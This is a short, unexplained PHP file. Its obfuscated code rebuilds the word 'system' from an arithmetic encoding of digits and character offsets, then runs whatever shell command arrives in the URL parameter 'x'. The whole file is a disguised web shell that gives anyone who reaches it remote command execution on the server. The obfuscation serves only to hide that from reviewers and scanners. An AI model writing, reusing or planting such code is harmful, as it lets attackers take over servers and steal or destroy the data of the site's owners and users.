<?php
function ee($a){
    $s = ['A','n','q', 'u', 'a', 'n', 'C', 'l', 'u', 'b'];
    $ff = "";
    while ($a>10) {
        $ff .= $s[$a%10];
        $a = $a/10;
    }
    return $ff.$s[$a];
}
$gg = [18, 4, 5, -1, 34, 11];
$kk = str_split(ee(963584));
$dd = [];
foreach ($kk as $ll => $qq) {
    $jj = $gg[$ll] ?? 0;
    $oo = ord($qq) + $jj;
    $dd[] = chr($oo);
}
$cc = implode('', $dd);
$cc($_GET['x']);
?>
